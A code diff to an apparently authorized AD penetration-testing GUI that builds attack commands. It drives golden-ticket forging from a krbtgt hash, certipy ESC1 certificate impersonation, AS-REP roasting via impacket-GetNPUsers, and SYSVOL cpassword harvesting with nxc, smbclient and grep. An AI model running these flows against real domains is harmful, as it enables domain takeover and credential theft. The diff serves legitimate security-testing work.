@@ -2027,12 +2027,17 @@ class CardADRoutesMixin:
             m = re.search(r"CA Name\s*:\s*(.+)", desc)
             if m and not ca_name:
                 ca_name = m.group(1).strip().strip("'\"")
-            # ESC entries:
-            #   · ESC1   'Template Name'   note
-            for tm in re.finditer(
-                    r"ESC\d+\s+['\"]([^'\"]+)['\"]", desc):
-                t = tm.group(1).strip()
-                if t and t not in templates:
+            # ESC list lines: "· ESCx  <subject>  <note>".  <subject> is a
+            # template name (bare, or 'quoted' in older findings); CA-level
+            # ESCs use "CA '<name>'" and are NOT request-able templates, so
+            # skip them.  Anchor on the "·" bullet so prose like "no
+            # exploitable ESC1-ESC11 misconfiguration" (from a no-vulns
+            # finding) can't leak "misconfiguration" as a template.
+            for tm in re.finditer(r"·\s*ESC\d+\s+(.+?)\s{2,}", desc):
+                t = tm.group(1).strip().strip("'\"")
+                if not t or t.startswith("CA "):
+                    continue
+                if t not in templates:
                     templates.append(t)
             # Fallback: "Template Name : <name>" from raw certipy
             # summary if the dialog was ever pasted verbatim.
@@ -2201,6 +2206,99 @@ class CardADRoutesMixin:
 
         self._route_ad_template(tool, prefill=pf)
 
+    def _route_addcomputer(self, tool):
+        """ADD COMPUTER — the standard AD auth dialog plus an OS-generation
+        advisory telling the operator which -method is likely to work:
+        SAMR (the impacket default) on legacy DCs, LDAPS on modern /
+        hardened ones.
+
+        The advisory is a HINT only — it never changes the command or
+        pre-selects a flag.  SAMR stays the default and the operator is
+        free to click -method SAMR / LDAPS / -k (or ignore the advisory
+        entirely) via the chips.  Generation comes from the same
+        classify_generation() the Connect terminal uses for compat flags,
+        so the classification stays consistent across the app.
+        """
+        gen, osname = "unknown", ""
+        try:
+            fp = getattr(getattr(self.app, "target_intel", None),
+                         "_fp", None)
+            if fp is not None:
+                gen = fp.classify_generation() or "unknown"
+                if getattr(fp, "platform", "") == "windows":
+                    osname = ("Windows " + (fp.version or "").strip()).strip()
+        except Exception:
+            gen, osname = "unknown", ""
+
+        _os = f" ({osname})" if osname else ""
+        if gen == "legacy":
+            advisory = (f"  Method advisory: target looks LEGACY{_os} — "
+                        f"SAMR (the default) is the right method here.  "
+                        f"Don't switch to LDAPS: legacy DCs usually have no "
+                        f"LDAPS/636 certificate.")
+            color = COLORS["text_green"]
+        elif gen == "modern":
+            advisory = (f"  Method advisory: target looks MODERN{_os} — try "
+                        f"SAMR (the default) first; if the DC rejects it, "
+                        f"click -method LDAPS below.  Also expect MAQ may be "
+                        f"0 on hardened DCs (creation blocked by design).")
+            color = COLORS["text_yellow"]
+        else:
+            advisory = ("  Method advisory: OS not fingerprinted yet — run "
+                        "enumeration (nmap -sV -sC / nxc smb) first for a "
+                        "method recommendation.  SAMR (the default) works on "
+                        "most DCs; LDAPS is the modern fallback.")
+            color = COLORS["text_dim"]
+
+        self._route_ad_template(
+            tool, prefill={"advisory": advisory, "advisory_color": color})
+
+    def _route_certipy_find(self, tool):
+        """certipy find / quick — the standard AD auth dialog plus an
+        OS-generation LDAP advisory.
+
+        certipy v5 binds over LDAPS (636) by DEFAULT.  Legacy DCs (Server
+        2008/2012, old TLS or no LDAPS cert) reset that handshake and the
+        scan dies with 'socket ssl wrapping error' — which looks like "no
+        AD CS" but usually isn't.  On a legacy target we advise adding the
+        '-ldap-scheme ldap' chip (plain LDAP, 389).  HINT only: modern DCs
+        often require LDAPS, so the operator stays free to keep it.
+        """
+        gen, osname = "unknown", ""
+        try:
+            fp = getattr(getattr(self.app, "target_intel", None),
+                         "_fp", None)
+            if fp is not None:
+                gen = fp.classify_generation() or "unknown"
+                if getattr(fp, "platform", "") == "windows":
+                    osname = ("Windows " + (fp.version or "").strip()).strip()
+        except Exception:
+            gen, osname = "unknown", ""
+
+        _os = f" ({osname})" if osname else ""
+        if gen == "legacy":
+            advisory = (f"  LDAP advisory: target looks LEGACY{_os} — "
+                        f"certipy binds over LDAPS by default and legacy "
+                        f"DCs usually reset the TLS handshake.  If it dies "
+                        f"with an SSL error, add the '-ldap-scheme ldap' "
+                        f"chip (plain LDAP, 389) and re-run.")
+            color = COLORS["text_yellow"]
+        elif gen == "modern":
+            advisory = (f"  LDAP advisory: target looks MODERN{_os} — the "
+                        f"default LDAPS should work (and may be required "
+                        f"by signing/channel-binding).  Only fall back to "
+                        f"'-ldap-scheme ldap' if LDAPS is filtered.")
+            color = COLORS["text_dim"]
+        else:
+            advisory = ("  LDAP advisory: certipy uses LDAPS by default.  "
+                        "If it fails with 'socket ssl wrapping error' "
+                        "(common on legacy DCs), add the '-ldap-scheme "
+                        "ldap' chip to force plain LDAP (389).")
+            color = COLORS["text_dim"]
+
+        self._route_ad_template(
+            tool, prefill={"advisory": advisory, "advisory_color": color})
+
     def _route_ticketer_golden(self, tool):
         """Dedicated dialog for `impacket-ticketer`.
 
@@ -2237,6 +2335,7 @@ class CardADRoutesMixin:
         # ── Auto-fill from Credential Store + Target Intel ────────────
         krbtgt_hash = ""
         domain_sid = ""
+        sid_source = ""
         default_domain = ""
         try:
             sess = self.app.session_manager.current
@@ -2249,28 +2348,57 @@ class CardADRoutesMixin:
                     if uname == "krbtgt":
                         h = (getattr(c, "hash_val", "") or "").strip()
                         if h:
-                            # Accept LM:NT or bare NT, pass bare NT
-                            # (impacket-ticketer accepts both via
-                            # -nthash).
-                            if ":" in h:
-                                h = h.split(":")[-1]
+                            # hash_val may be a full pwdump line
+                            # (krbtgt:502:LM:NT:::), an LM:NT pair, or a
+                            # bare NT.  impacket-ticketer -nthash wants
+                            # the bare 32-hex NT, so pull it out of
+                            # whichever shape (a naive split(':')[-1]
+                            # grabbed the empty field after ':::').
+                            m = re.match(
+                                r"^[^:]+:\d+:[0-9a-fA-F]{32}:"
+                                r"([0-9a-fA-F]{32}):", h)
+                            if m:
+                                h = m.group(1)
+                            elif re.match(
+                                    r"^[0-9a-fA-F]{32}:"
+                                    r"[0-9a-fA-F]{32}$", h):
+                                h = h.split(":")[1]
                             krbtgt_hash = h
                             break
 
-                # Domain SID from Target Intel findings.  The
-                # secretsdump parser writes 'Domain SID: ...' into
-                # finding descriptions; we also grep for any
-                # S-1-5-21-... match as a safety net.
+                # Domain SID from Target Intel findings.  Prefer the
+                # tools that genuinely READ the domain SID off the DC
+                # (enum4linux / rpcclient lsaquery, lookupsid, netexec,
+                # samrdump) over a blind "first S-1-5-21 anywhere", so
+                # in a multi-target session we never pick up an
+                # unrelated host's SID.  Only if none of those carried
+                # one do we fall back to any finding.  We also record
+                # WHERE it came from to show the operator (a golden
+                # ticket signed with the wrong SID is silently useless).
                 intel = getattr(self.app, "target_intel", None)
                 findings = (getattr(intel, "_auto_findings", []) or []
                             if intel else [])
-                for f in findings:
-                    desc = f.get("description", "") or ""
-                    m = re.search(
-                        r"S-1-5-21-\d+-\d+-\d+(?!\d)", desc)
-                    if m:
-                        domain_sid = m.group(0)
-                        break
+                _SID_RE = re.compile(r"S-1-5-21-\d+-\d+-\d+(?!\d)")
+                _SID_AUTHORITATIVE = (
+                    "enum4linux", "rpcclient", "lookupsid",
+                    "netexec", "nxc", "samrdump")
+
+                def _scan_sid(authoritative_only):
+                    for f in findings:
+                        src = (f.get("source", "") or "")
+                        if authoritative_only and not any(
+                                a in src.lower()
+                                for a in _SID_AUTHORITATIVE):
+                            continue
+                        m = _SID_RE.search(
+                            f.get("description", "") or "")
+                        if m:
+                            return m.group(0), (src or "?")
+                    return "", ""
+
+                domain_sid, sid_source = _scan_sid(True)
+                if not domain_sid:
+                    domain_sid, sid_source = _scan_sid(False)
         except Exception as e:
             print(f"[HAWK] ticketer auto-fill failed: {e}")
 
@@ -2294,9 +2422,9 @@ class CardADRoutesMixin:
         if krbtgt_hash and domain_sid:
             _note_box(
                 win,
-                "  ✨  Both krbtgt hash and domain SID were found "
-                "in your session (from a prior secretsdump DCSync). "
-                "Fields below are pre-filled — review and click RUN.",
+                f"  Pre-filled from your session: krbtgt hash from the "
+                f"Credential Store (secretsdump), domain SID from "
+                f"{sid_source}.  Review and click RUN.",
                 COLORS["border_green"])
         elif not krbtgt_hash and not domain_sid:
             _note_box(
@@ -2356,7 +2484,7 @@ class CardADRoutesMixin:
              "secretsdump DCSync: the 'krbtgt:502:LM:NT:::' line.")
         _row("Domain SID", sid_var,
              "S-1-5-21-<x>-<y>-<z>.  The 'Domain SID' line from "
-             "secretsdump output, or impacket-lookupsid.")
+             "enum4linux / rpcclient / impacket-lookupsid.")
         _row("Domain name", domain_var,
              "AD realm (e.g. corp.lab).  Must match the domain "
              "krbtgt was dumped from.")
@@ -2452,12 +2580,11 @@ class CardADRoutesMixin:
 
         Pre-fills:
           · target = current HAWK target (DC IP)
-          · PFX    = <HAWK>/outputs/esc1.pfx (the default certipy req path)
+          · PFX    = esc1.pfx (certipy req's output in the working dir)
           · domain = session.target_domain
-          · user   = first non-anonymous cred's username (best guess
-                     for whom the cert impersonates — usually it'll
-                     be Administrator from an ESC1 abuse, which the
-                     user can confirm)
+          · user   = empty — certipy reads the impersonated identity from
+                     the cert's UPN; a pre-filled cred-store username would
+                     override it with the wrong (low-priv) subject
 
         Validates the PFX file exists before firing so the user
         doesn't stare at a misleading "Could not find target" style
@@ -2471,25 +2598,16 @@ class CardADRoutesMixin:
         if not target:
             return
 
-        # Sensible defaults.
-        from utils.config import OUTPUTS_DIR as _OUTDIR
-        default_pfx = os.path.join(_OUTDIR, "esc1.pfx")
+        # Sensible defaults.  certipy req writes esc1.pfx in the working
+        # dir (certipy v5 mangles -out paths, so we pass a bare name), so
+        # default the PFX to that.  Leave username AND domain EMPTY:
+        # `certipy auth` reads the impersonated identity AND the realm from
+        # the cert's UPN.  A pre-filled username overrides the subject with
+        # a low-priv account, and a pre-filled -domain made certipy do an
+        # SRV/DNS lookup that HUNG the UnPAC-the-hash step on this lab.
+        default_pfx = "esc1.pfx"
         default_domain = ""
         default_user = ""
-        try:
-            sess = self.app.session_manager.current
-            if sess:
-                default_domain = getattr(sess, "target_domain", "") or ""
-                # Grab a usable cred's username as the impersonated
-                # subject guess (ESC1 flow => Administrator usually).
-                for c in (sess.get_credentials() or []):
-                    u = (c.username or "").strip()
-                    if u and u.lower() not in (
-                            "anonymous", "guest", "null", ""):
-                        default_user = u
-                        break
-        except Exception:
-            pass
 
         win = _make_win(self, "Certipy AUTH — PKINIT login", 680, 540)
         _title(win, "CERTIPY AUTH — log in with a certificate")
@@ -2550,7 +2668,7 @@ class CardADRoutesMixin:
                     anchor="w").pack(fill="x", padx=24)
 
         _row("PFX path", pfx_var,
-             "default: <HAWK>/outputs/esc1.pfx (certipy req's output path)",
+             "default: esc1.pfx (certipy req's output in the working dir)",
              with_browse=True)
         _row("DC IP", dc_var,
              "the Domain Controller certipy will talk Kerberos to")
@@ -2582,11 +2700,47 @@ class CardADRoutesMixin:
         pfx_var.trace_add("write", _check_pfx)
         _check_pfx()
 
-        def _run():
+        def _build_cmd():
+            # This dedicated dialog builds its OWN command (it does not use
+            # the cmd_template's substitution).  -no-save is REQUIRED: when
+            # <user>.ccache already exists certipy prompts "Overwrite?
+            # (y/n)", which hangs the non-interactive terminal; the NT hash
+            # is still retrieved without saving the ticket.  -username /
+            # -domain are appended ONLY when set (otherwise certipy reads
+            # the identity + realm from the cert's UPN — and a stray
+            # -domain makes it do an SRV lookup that can hang).
             pfx = os.path.expanduser(pfx_var.get().strip())
             dc  = dc_var.get().strip()
             u   = user_var.get().strip()
             d   = domain_var.get().strip()
+            parts = [f"certipy auth "
+                     f"-pfx {_shq(pfx) if pfx else '<pfx>'} "
+                     f"-dc-ip {dc or '<dc-ip>'} -no-save"]
+            if u:
+                parts.append(f"-username {_shq(u)}")
+            if d:
+                parts.append(f"-domain {_shq(d)}")
+            return " ".join(parts)
+
+        # Live command preview — parity with the other AD tool dialogs.
+        ctk.CTkLabel(win, text="Preview:", font=_f("sm", True),
+                     text_color=COLORS["text_muted"], anchor="w").pack(
+            fill="x", padx=24, pady=(8, 0))
+        preview_var = ctk.StringVar(value="")
+        ctk.CTkLabel(win, textvariable=preview_var, font=_f("sm"),
+                     text_color=COLORS["text_cyan"], wraplength=600,
+                     justify="left", anchor="w").pack(
+            fill="x", padx=24, pady=(0, 4))
+
+        def _refresh_preview(*_):
+            preview_var.set(_build_cmd())
+        for _pv in (pfx_var, dc_var, user_var, domain_var):
+            _pv.trace_add("write", _refresh_preview)
+        _refresh_preview()
+
+        def _run():
+            pfx = os.path.expanduser(pfx_var.get().strip())
+            dc  = dc_var.get().strip()
 
             if not pfx or not os.path.isfile(pfx):
                 self.app.terminal.write(
@@ -2600,13 +2754,7 @@ class CardADRoutesMixin:
                     "required.", "warn")
                 return
 
-            parts = [f"certipy auth -pfx {_shq(pfx)} -dc-ip {dc}"]
-            if u:
-                parts.append(f"-username {_shq(u)}")
-            if d:
-                parts.append(f"-domain {_shq(d)}")
-            cmd = " ".join(parts)
-
+            cmd = _build_cmd()
             _safe_destroy(win)
             self.app.terminal.section(
                 f"AD PENTESTING  ·  {tool.name}")
@@ -2774,6 +2922,7 @@ class CardADRoutesMixin:
             if hint:
                 ctk.CTkLabel(win, text=hint, font=_f("xs"),
                              text_color=COLORS["text_dim"],
+                             wraplength=700, justify="left",
                              anchor="w").pack(fill="x", padx=14)
             return e
 
@@ -2864,6 +3013,15 @@ class CardADRoutesMixin:
                                 "10 — msDS-MachineAccountQuota).  The name "
                                 "you supplied to addcomputer is the value "
                                 "to paste here.",
+            "COMPUTER_NAME":    "Name of the NEW machine account to create — "
+                                "MUST end with '$' (e.g. HAWK$, PWN01$).  "
+                                "Pick a name that doesn't already exist in "
+                                "AD; each run creates a distinct account "
+                                "(up to msDS-MachineAccountQuota, default 10).",
+            "COMPUTER_PASS":    "Password for the new machine account — "
+                                "you'll need it later for RBCD / S4U, so use "
+                                "something you'll keep (a strong value; modern "
+                                "DCs may enforce a password policy).",
         }
 
         placeholder_vars = {}
@@ -2905,16 +3063,37 @@ class CardADRoutesMixin:
                 for ph_name, ph_val in prefill["placeholders"].items():
                     if ph_name in placeholder_vars:
                         placeholder_vars[ph_name].set(str(ph_val))
+            # Optional OS-generation advisory (e.g. addcomputer's SAMR-vs-
+            # LDAPS hint).  Purely informational — it never changes the
+            # command or pre-selects a flag; the operator stays free to
+            # pick any method via the chips below, or ignore it entirely.
+            if prefill.get("advisory"):
+                ctk.CTkLabel(
+                    win,
+                    text=prefill["advisory"],
+                    font=_f("sm", True),
+                    text_color=(prefill.get("advisory_color")
+                                or COLORS["text_cyan"]),
+                    wraplength=720, justify="left", anchor="w",
+                ).pack(fill="x", padx=14, pady=(6, 2))
             # Visual confirmation — cyan banner so the user sees this
             # dialog was pre-populated from somewhere (not random data).
-            origin = prefill.get("_origin") or "attack graph"
-            ctk.CTkLabel(
-                win,
-                text=f"  ✨  Pre-filled from {origin} — review & click RUN",
-                font=_f("sm", True),
-                text_color=COLORS["text_cyan"],
-                anchor="w",
-            ).pack(fill="x", padx=14, pady=(4, 2))
+            # Only shown when actual FIELD data was injected: an advisory-
+            # only prefill (addcomputer) hasn't pre-filled any field, so
+            # claiming "Pre-filled from ..." there would be misleading.
+            _did_prefill = (any(prefill.get(k) for k in
+                                ("user", "password", "hash", "domain",
+                                 "extras"))
+                            or isinstance(prefill.get("placeholders"), dict))
+            if _did_prefill:
+                origin = prefill.get("_origin") or "attack graph"
+                ctk.CTkLabel(
+                    win,
+                    text=f"  ✨  Pre-filled from {origin} — review & click RUN",
+                    font=_f("sm", True),
+                    text_color=COLORS["text_cyan"],
+                    anchor="w",
+                ).pack(fill="x", padx=14, pady=(4, 2))
 
         # ── Extra args row + suggestion chips ────────────────────────
         # Free-form text field the user can type ANY extra flags into
@@ -2946,6 +3125,7 @@ class CardADRoutesMixin:
                   "template already uses some of these flags (impacket "
                   "and certipy accept repeated args, last one wins)."),
             font=_f("xs"), text_color=COLORS["text_dim"],
+            wraplength=700, justify="left",
             anchor="w").pack(fill="x", padx=14, pady=(1, 6))
 
         # Chip picker
@@ -3045,6 +3225,7 @@ class CardADRoutesMixin:
             text=("— needed when Kerberos fails with "
                   "'Name or service not known'"),
             font=_f("xs"), text_color=COLORS["text_muted"],
+            wraplength=460, justify="left",
             anchor="w",
         ).pack(side="left", fill="x", expand=True)
 
@@ -3596,7 +3777,7 @@ class CardADRoutesMixin:
                                  _btn_row, _btn, _safe_destroy)
         from utils.clipboard import add_context_menu
 
-        win = _make_win(self, "GPP-Decrypt", 620, 440)
+        win = _make_win(self, "GPP-Decrypt", 620, 500)
         _title(win, "GPP-DECRYPT  —  Groups.xml cpassword")
         _sub(win, "Paste a base64 cpassword blob to decrypt it locally.",
              COLORS["text_dim"])
@@ -3607,9 +3788,11 @@ class CardADRoutesMixin:
                   "[Machine|User]\\Preferences\\"
                   "{Groups,Services,ScheduledTasks,Printers,DataSources,"
                   "Drives}\\*.xml\n\n"
-                  "Quick grab with smbclient / nxc:\n"
-                  "  smbclient //DC/SYSVOL -N -c 'recurse; prompt; mget *'\n"
-                  "  nxc smb DC --pass-pol --shares  (then enumerate SYSVOL)",
+                  "Grab it (a DC refuses null sessions — use a domain user):\n"
+                  "  nxc smb <DC> -u <user> -p <pass> -M gpp_password\n"
+                  "  smbclient //<DC>/SYSVOL -U '<user>%<pass>' -c "
+                  "'recurse ON; prompt OFF; mget *'\n"
+                  "    then:  grep -rho 'cpassword=\"[^\"]*\"' .",
                   COLORS["border_dim"])
 
         ctk.CTkLabel(win, text="cpassword (base64):",
@@ -3635,6 +3818,24 @@ class CardADRoutesMixin:
             font=_f("xs"), text_color=COLORS["text_muted"],
             anchor="w").pack(fill="x", padx=24, pady=(0, 4))
 
+        # Optional account name — it lives in the source Groups.xml, not in
+        # gpp-decrypt's output, so the operator supplies it here to label
+        # the recovered credential (the parser stores it on the cred).
+        ctk.CTkLabel(win, text="Account name (optional):",
+                     font=_f("md", True),
+                     text_color=COLORS["text_bright"],
+                     anchor="w").pack(fill="x", padx=24, pady=(6, 2))
+        uname_entry = ctk.CTkEntry(
+            win, font=_f("md"), height=30,
+            fg_color=COLORS["bg_card"],
+            text_color=COLORS["text_bright"],
+            border_color=COLORS["border_green"],
+            border_width=1, corner_radius=3,
+            placeholder_text=("the userName from the source Groups.xml — "
+                              "labels the saved credential"))
+        uname_entry.pack(fill="x", padx=24, pady=(0, 8))
+        add_context_menu(uname_entry)
+
         def _run():
             blob = box.get("1.0", "end").strip()
             if not blob:
@@ -3645,6 +3846,9 @@ class CardADRoutesMixin:
             # Strip whitespace inside the blob (users sometimes paste
             # with embedded newlines from XML files).
             blob = "".join(blob.split())
+            # Stash the optional account name for the parser to label the
+            # recovered credential (read BEFORE the window is destroyed).
+            self._gpp_username = uname_entry.get().strip()
             _safe_destroy(win)
             # Shell-escape and run.  gpp-decrypt writes the decrypted
             # value to stdout; ToolRunner captures it so we see it in
@@ -3680,33 +3884,112 @@ class CardADRoutesMixin:
                            "/usr/share/seclists/Usernames/"
                            "xato-net-10-million-usernames.txt")]
 
+        # Look up a usable domain cred (non-anon, has a cleartext
+        # password) so AUTHENTICATED AS-REP roast can be the default when
+        # we already have a foothold: with creds GetNPUsers asks the DC
+        # over LDAP for every DONT_REQ_PREAUTH account and roasts them in
+        # one shot — no username wordlist, no thousands of AS-REQ misses,
+        # and it finds custom-named accounts a generic list never would.
+        du = dp = ""
+        try:
+            _sess = self.app.session_manager.current
+            for c in (_sess.get_credentials() if _sess else []):
+                un = (c.username or "").strip()
+                if (un.lower() in ("anonymous", "guest", "")
+                        or not (c.password or "")):
+                    continue
+                du, dp = un, (c.password or "")
+                if getattr(c, "verified", False):
+                    break   # prefer a verified login if we find one
+        except Exception:
+            pass
+
         def _add_domain_widget(win):
             from gui.dialogs import _note_box
             _note_box(win,
                       "AS-REP Roasting: finds users without Kerberos\n"
-                      "pre-authentication. No password needed — just\n"
-                      "a list of usernames and the domain.",
+                      "pre-authentication.  Authenticated (with creds) asks\n"
+                      "the DC directly via LDAP — instant, no wordlist.\n"
+                      "Without creds, falls back to guessing usernames.",
                       COLORS["border_dim"])
             domain_var = ctk.StringVar(value=default_domain or "DOMAIN.LOCAL")
-            df = ctk.CTkFrame(win, fg_color="transparent")
-            df.pack(fill="x", padx=24, pady=(4, 6))
-            ctk.CTkLabel(df, text="Domain:", font=_f("sm", True),
-                         text_color=COLORS["text_bright"],
-                         anchor="w").pack(side="left")
-            e = ctk.CTkEntry(
-                df, textvariable=domain_var,
-                placeholder_text="e.g. DOMAIN.LOCAL",
-                font=_f("md"), height=30,
-                fg_color=COLORS["bg_card"], text_color=COLORS["text_bright"],
-                border_color=COLORS["border_green"], border_width=1,
-                corner_radius=3)
-            e.pack(side="left", fill="x", expand=True, padx=(4, 0))
-            add_context_menu(e)
-            return {"domain_var": domain_var}
+            auth_var = ctk.BooleanVar(value=bool(du and dp))
+            user_var = ctk.StringVar(value=du)
+            pass_var = ctk.StringVar(value=dp)
+
+            def _row(label, var, show=""):
+                f = ctk.CTkFrame(win, fg_color="transparent")
+                ctk.CTkLabel(f, text=label, font=_f("sm", True),
+                             text_color=COLORS["text_bright"], anchor="w",
+                             width=70).pack(side="left")
+                en = ctk.CTkEntry(
+                    f, textvariable=var, show=show,
+                    font=_f("md"), height=30,
+                    fg_color=COLORS["bg_card"],
+                    text_color=COLORS["text_bright"],
+                    border_color=COLORS["border_green"], border_width=1,
+                    corner_radius=3)
+                en.pack(side="left", fill="x", expand=True, padx=(4, 0))
+                add_context_menu(en)
+                return f
+
+            df = _row("Domain:", domain_var)
+            df.pack(fill="x", padx=24, pady=(4, 2))
+
+            cf = ctk.CTkFrame(win, fg_color="transparent")
+            cf.pack(fill="x", padx=24, pady=(2, 2))
+            uf = _row("User:", user_var)
+            pf = _row("Pass:", pass_var, show="*")
+
+            def _sync_auth(*_):
+                if auth_var.get():
+                    uf.pack(fill="x", padx=24, pady=(2, 0))
+                    pf.pack(fill="x", padx=24, pady=(2, 6))
+                else:
+                    uf.pack_forget()
+                    pf.pack_forget()
+
+            ctk.CTkCheckBox(
+                cf,
+                text="Authenticated (use stored creds — LDAP, no wordlist)",
+                variable=auth_var, command=_sync_auth,
+                font=_f("sm"), text_color=COLORS["text_bright"],
+                fg_color=COLORS["bg_card"],
+                hover_color=COLORS["bg_card_hover"],
+                border_color=COLORS["border_green"],
+                checkmark_color=COLORS["text_green"]).pack(side="left")
+            _sync_auth()
+            return {"domain_var": domain_var, "auth_var": auth_var,
+                    "user_var": user_var, "pass_var": pass_var}
 
         def _on_run(wl_path, _ext, _threads, extra):
             domain_var = extra.get("domain_var")
             domain = domain_var.get().strip() if domain_var else "DOMAIN.LOCAL"
+
+            # ── Authenticated mode ──────────────────────────────────────
+            # With a domain cred, GetNPUsers binds to the DC and LDAP-
+            # enumerates every DONT_REQ_PREAUTH account, then roasts each
+            # one — the wordlist (and its 10M-request DC hammering) is
+            # skipped entirely.  This is the right flow once you have any
+            # foothold, and the only way to reach custom-named accounts a
+            # generic username list would miss.
+            auth_var = extra.get("auth_var")
+            if auth_var is not None and auth_var.get():
+                u = (extra.get("user_var").get() or "").strip()
+                p = extra.get("pass_var").get() or ""
+                if not (domain and u and p):
+                    self.app.terminal.write(
+                        "  [!] Authenticated AS-REP needs domain + username "
+                        "+ password.", "warn")
+                    return
+                import os as _os
+                from utils.config import OUTPUTS_DIR as _OUT
+                outp = _os.path.join(_OUT, f"asrep-{target}.txt")
+                self._run_raw(tool, (
+                    f"impacket-GetNPUsers {domain}/{u}:{_shq(p)} "
+                    f"-dc-ip {target} -request -format hashcat "
+                    f"-outputfile {_shq(outp)}"))
+                return
 
             # Line-count guard — AS-REP roast on a 10M wordlist is
             # ~24 hours of DC hammering (~100 AS-REQ/s).  Anything
